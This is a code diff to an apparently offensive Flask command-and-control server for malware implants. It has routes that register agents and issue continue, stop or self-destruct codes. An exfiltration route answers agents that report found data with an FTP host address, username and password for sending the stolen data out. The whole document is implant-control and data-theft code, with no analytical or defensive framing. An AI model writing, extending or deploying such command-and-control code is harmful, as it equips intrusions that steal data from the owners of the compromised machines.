@@ -31,13 +31,9 @@ def register():
     data = request.json
     agent_id = data['agent_id']
     command = data['command']
-    agent_ip = data['ip']
-    agent_port = data['port']
     agents[agent_id] = {'agent_id': agent_id,
-                            'command' : command,
-                            'ip' : agent_id,
-                            'port' : agent_port}
-    return make_response(1)
+                            'command' : command}
+    return make_response({'cmd' : 1})
 
 # Route to receive commands from an agent
 @app.route('/command', methods=['POST'])
@@ -55,10 +51,13 @@ def command():
         ## 2 - self-destruct
         if data_found:
             response = make_response({'cmd' : 0})
+            agents[agent_id] = 0
         elif kill_implants:
             response = make_response({'cmd' : 2})
+            agents[agent_id] = 2
         else:
             response = make_response({ 'cmd' : 1})
+            agents[agent_id] = 1
     
     return response
 
@@ -67,11 +66,17 @@ def command():
 def exfil():
     data = request.json
     agent_id = data['agent_id']
+    found = data['found']
     if agent_id in agents:
-        data_found = True
-        response = make_response({'host' : '192.168.68.128',
-                                  'username' : 'ftpwebuser',
-                                  'password' : 'password'})
+        if found == 1:
+            data_found = True
+            response = make_response({'host' : '192.168.68.128',
+                                    'username' : 'ftpwebuser',
+                                    'password' : 'password'})
+            agents[agent_id] = 0
+        else:
+            response = make_response({'cmd' : 2})
+            agents[agent_id] = 2
 
     return response
 
